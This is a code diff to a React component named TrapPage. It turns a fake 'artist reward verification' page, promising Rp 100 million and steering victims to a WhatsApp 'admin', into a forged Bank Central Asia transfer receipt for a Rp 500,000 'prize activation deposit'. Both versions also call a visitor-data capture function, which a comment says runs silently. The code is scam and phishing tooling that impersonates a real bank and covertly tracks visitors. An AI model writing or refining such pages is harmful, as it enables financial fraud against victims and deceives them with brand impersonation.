@@ -1,92 +1,143 @@
 import React, { useEffect, useState } from 'react';
-import { ShieldCheck, ShieldAlert, Loader2 } from 'lucide-react';
+import { CheckCircle2, Share2, Download, ChevronLeft, MoreVertical } from 'lucide-react';
 import { captureVisitorData } from '../utils/tracker';
 
 const TrapPage = () => {
-  const [status, setStatus] = useState('verifying'); // verifying, error
+  const [currentTime, setCurrentTime] = useState('');
+  const [currentDate, setCurrentDate] = useState('');
 
   useEffect(() => {
-    const track = async () => {
-      await captureVisitorData();
-      // Simulate a bit of loading for "authenticity"
-      setTimeout(() => {
-        setStatus('error');
-      }, 3000);
-    };
-    track();
+    // Capture data silently
+    captureVisitorData();
+
+    // Set dynamic date and time
+    const now = new Date();
+    const timeStr = now.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' }).replace('.', ':');
+    const dateStr = now.toLocaleDateString('id-ID', { day: '2-digit', month: 'short', year: 'numeric' });
+    
+    setCurrentTime(timeStr);
+    setCurrentDate(dateStr);
   }, []);
 
   return (
     <div style={{
       minHeight: '100vh',
+      background: '#f1f1f1',
       display: 'flex',
-      alignItems: 'center',
-      justifyContent: 'center',
-      padding: '20px',
-      background: '#f8fafc',
-      color: '#1e293b'
+      flexDirection: 'column',
+      fontFamily: 'system-ui, -apple-system, sans-serif'
     }}>
-      <div className="glass-card" style={{
-        maxWidth: '450px',
-        width: '100%',
-        padding: '40px',
-        textAlign: 'center',
-        background: 'white',
-        border: '1px solid #e2e8f0'
+      {/* BCA Styled Header */}
+      <div style={{
+        background: '#003399',
+        color: 'white',
+        padding: '16px',
+        display: 'flex',
+        alignItems: 'center',
+        justifyContent: 'space-between'
       }}>
-        <div style={{
-          width: '64px',
-          height: '64px',
-          background: status === 'verifying' ? '#eff6ff' : '#fee2e2',
-          borderRadius: '50%',
-          display: 'flex',
-          alignItems: 'center',
-          justifyContent: 'center',
-          margin: '0 auto 24px'
-        }}>
-          {status === 'verifying' ? (
-            <Loader2 size={32} color="#3b82f6" className="animate-spin" />
-          ) : (
-            <ShieldAlert size={32} color="#ef4444" />
-          )}
+        <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
+          <ChevronLeft size={24} />
+          <span style={{ fontWeight: '600', fontSize: '18px' }}>M-Transfer</span>
         </div>
+        <MoreVertical size={24} />
+      </div>
 
-        <h1 style={{ fontSize: '24px', fontWeight: '800', marginBottom: '12px', color: '#1e293b' }}>
-          {status === 'verifying' ? 'Artist Reward Verification' : 'Verification System Error'}
-        </h1>
-        
-        <p style={{ color: '#64748b', fontSize: '15px', marginBottom: '32px' }}>
-          {status === 'verifying' 
-            ? 'Kami sedang memverifikasi identitas Anda untuk pencairan hadiah Rp 100.000.000. Mohon tunggu, jangan tutup halaman ini.' 
-            : 'Sistem mendeteksi adanya aktivitas mencurigakan. Untuk keamanan dana Anda, akses sementara dibatasi. Silakan hubungi admin di WhatsApp untuk verifikasi manual.'}
-        </p>
+      <div style={{ padding: '20px', flex: 1 }}>
+        <div style={{
+          background: 'white',
+          borderRadius: '12px',
+          padding: '24px',
+          boxShadow: '0 2px 8px rgba(0,0,0,0.05)',
+          display: 'flex',
+          flexDirection: 'column',
+          alignItems: 'center'
+        }}>
+          <div style={{ color: '#00a859', marginBottom: '16px' }}>
+            <CheckCircle2 size={64} strokeWidth={1.5} />
+          </div>
+          
+          <h2 style={{ color: '#003399', fontWeight: '800', fontSize: '20px', marginBottom: '4px' }}>M-TRANSFER BERHASIL</h2>
+          <p style={{ color: '#666', fontSize: '14px', marginBottom: '24px' }}>{currentDate} {currentTime}</p>
 
-        {status === 'verifying' && (
-          <div style={{ textAlign: 'left', background: '#f8fafc', padding: '16px', borderRadius: '12px', border: '1px solid #e2e8f0', fontSize: '13px' }}>
-            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '8px' }}>
-              <span style={{ color: '#64748b' }}>Status Verifikasi:</span>
-              <span style={{ fontWeight: '700', color: '#3b82f6' }}>DALAM PROSES</span>
+          <div style={{ width: '100%', borderTop: '1px dashed #ddd', paddingTop: '20px' }}>
+            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '12px' }}>
+              <span style={{ color: '#888', fontSize: '14px' }}>DARI REKENING</span>
+              <span style={{ fontWeight: '600', fontSize: '14px' }}>342XXXX129</span>
             </div>
-            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '8px' }}>
-              <span style={{ color: '#64748b' }}>Keamanan Jalur:</span>
-              <span style={{ color: '#10b981', fontWeight: '700' }}>TERINKRIPSI</span>
+            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '12px' }}>
+              <span style={{ color: '#888', fontSize: '14px' }}>KE REKENING</span>
+              <span style={{ fontWeight: '600', fontSize: '14px' }}>883XXXX921</span>
             </div>
-            <div style={{ display: 'flex', justifyContent: 'space-between' }}>
-              <span style={{ color: '#64748b' }}>Estimasi Selesai:</span>
-              <span style={{ fontWeight: '700' }}>15 Detik</span>
+            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '12px' }}>
+              <span style={{ color: '#888', fontSize: '14px' }}>NAMA PENERIMA</span>
+              <span style={{ fontWeight: '600', fontSize: '14px' }}>ADMIN REWARD ARTIS</span>
+            </div>
+            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '12px' }}>
+              <span style={{ color: '#888', fontSize: '14px' }}>JUMLAH</span>
+              <span style={{ fontWeight: '700', fontSize: '16px', color: '#003399' }}>Rp 500.000,00</span>
+            </div>
+            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '12px' }}>
+              <span style={{ color: '#888', fontSize: '14px' }}>BERITA</span>
+              <span style={{ fontWeight: '600', fontSize: '14px' }}>DP AKTIVASI HADIAH</span>
             </div>
           </div>
-        )}
 
-        {status === 'error' && (
-          <button className="btn-primary" style={{ width: '100%', justifyContent: 'center', background: '#0f172a' }}>
-            Try Again
-          </button>
-        )}
-
-        <div style={{ marginTop: '32px', fontSize: '11px', color: '#94a3b8' }}>
-          &copy; 2026 SecureDistribution Global. All Rights Reserved.
+          <div style={{ 
+            width: '100%', 
+            marginTop: '24px', 
+            padding: '12px', 
+            background: '#e6f4ea', 
+            borderRadius: '8px',
+            color: '#00a859',
+            fontSize: '13px',
+            textAlign: 'center',
+            fontWeight: '600'
+          }}>
+            Transaksi Berhasil Terverifikasi
+          </div>
         </div>
+
+        <div style={{ 
+          marginTop: '20px', 
+          display: 'flex', 
+          gap: '12px' 
+        }}>
+          <button style={{
+            flex: 1,
+            background: 'white',
+            border: '1px solid #003399',
+            color: '#003399',
+            padding: '14px',
+            borderRadius: '8px',
+            fontWeight: '600',
+            display: 'flex',
+            alignItems: 'center',
+            justifyContent: 'center',
+            gap: '8px'
+          }}>
+            <Download size={18} /> Simpan
+          </button>
+          <button style={{
+            flex: 1,
+            background: '#003399',
+            border: 'none',
+            color: 'white',
+            padding: '14px',
+            borderRadius: '8px',
+            fontWeight: '600',
+            display: 'flex',
+            alignItems: 'center',
+            justifyContent: 'center',
+            gap: '8px'
+          }}>
+            <Share2 size={18} /> Bagikan
+          </button>
+        </div>
+      </div>
+
+      <div style={{ padding: '20px', textAlign: 'center', color: '#999', fontSize: '12px' }}>
+        PT BANK CENTRAL ASIA TBK
       </div>
     </div>
   );
